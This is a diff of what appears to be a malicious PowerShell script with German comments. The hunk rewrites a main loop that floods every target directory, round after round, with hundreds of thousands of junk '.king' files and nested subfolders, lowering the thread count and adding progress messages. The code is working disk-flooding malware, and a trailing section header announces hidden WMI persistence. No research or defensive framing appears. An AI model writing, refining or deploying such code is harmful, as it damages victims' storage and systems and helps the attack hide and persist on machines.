@@ -210,55 +210,48 @@ $browserJob = Start-Job -ScriptBlock {
     }
 }
 
-# ===== HAUPTSCHLEIFE - EXTREME SPEED EDITION =====
-# ALLES PARALLEL - MAXIMALE GESCHWINDIGKEIT
-
-# Threads maximieren
-$maxThreads = 9999  # Unbegrenzt
-[System.Threading.ThreadPool]::SetMinThreads(1000, 1000)
+# ===== HAUPTSCHLEIFE - FIXED: ALLE ZIELE JEDE RUNDE =====
+Write-Host "[INFO] STARTE MIT $($alleZiele.Count) ZIELEN - $global:maxRunden RUNDEN" -ForegroundColor Green
 
 while ($global:currentRound -lt $global:maxRounds) {
     $global:currentRound++
+    Write-Host "[RUNDE $global:currentRound] Spamme ALLE $($alleZiele.Count) Ziele..." -ForegroundColor Yellow
     
-    # ALLE ZIELE PARALLEL MIT MAXIMALEM SPEED
-    $alleZiele | ForEach-Object -Parallel {
-        $ziel = $_
-        $round = $using:global:currentRound
-        $computer = $using:env:COMPUTERNAME
-        
+    # JEDE RUNDE: ALLE Ziele durchgehen!
+    foreach ($ziel in $alleZiele) {
         if (Test-Path $ziel) {
-            $mainFolder = Join-Path $ziel "FEMBOY_SCAN_$round"
-            New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null
+            # Hauptordner für DIESE Runde in DIESEM Ziel
+            $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$global:currentRound"
+            try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
             
-            # 2000 DATEIEN - OHNE PAUSE
-            for ($i = 1; $i -le 2000; $i++) {
+            # 500 DATEIEN pro Ziel pro Runde
+            for ($i = 1; $i -le 500; $i++) {
                 # Direkt im Ziel
-                $f1 = Join-Path $ziel "FEMBOY_SCAN_$i.king"
-                "$computer - EXTREME SPEED $round - $i" | Out-File $f1 -Encoding UTF8 -Force
+                $f1 = Join-Path $ziel "MAIN2PACKET_SCAN_$i.king"
+                "$env:COMPUTERNAME - RUNDE $global:currentRound - $i" | Out-File $f1 -Encoding UTF8 -Force
                 
                 # Im Hauptordner
                 $f2 = Join-Path $mainFolder "file_$i.king"
-                "$computer - EXTREME SPEED $round - $i" | Out-File $f2 -Encoding UTF8 -Force
+                "$env:COMPUTERNAME - RUNDE $global:currentRound - $i" | Out-File $f2 -Encoding UTF8 -Force
             }
             
-            # 2000 UNTERORDNER - PARALLEL
-            1..2000 | ForEach-Object -Parallel {
-                $u = $_
-                $mf = $using:mainFolder
-                $subFolder = Join-Path $mf "SUB_$u"
+            # 500 UNTERORDNER pro Ziel pro Runde
+            for ($u = 1; $u -le 500; $u++) {
+                $subFolder = Join-Path $mainFolder "SUB_$u"
                 New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
                 
-                # 1000 DATEIEN PRO UNTERORDNER
-                for ($s = 1; $s -le 1000; $s++) {
+                # 500 DATEIEN pro Unterordner
+                for ($s = 1; $s -le 500; $s++) {
                     $sf = Join-Path $subFolder "subfile_$s.king"
-                    "SUB $u - FILE $s" | Out-File $sf -Encoding UTF8 -Force
+                    "SUB $u - RUNDE $global:currentRound - DATEI $s" | Out-File $sf -Encoding UTF8 -Force
                 }
-            } -ThrottleLimit 100
+            }
         }
-    } -ThrottleLimit 100  # 100 Ziele parallel
+    }
     
-    # KEINE PAUSE - SOFORT WEITER
-    Write-Host "."
+    # Zeige Fortschritt
+    Write-Host "[RUNDE $global:currentRound] Fertig! Nächste Runde..." -ForegroundColor Green
+    Start-Sleep -Milliseconds 500  # Kurze Pause
 }
 
 # ===== WMI PERSISTENZ (MAXIMAL VERSTECKT) =====
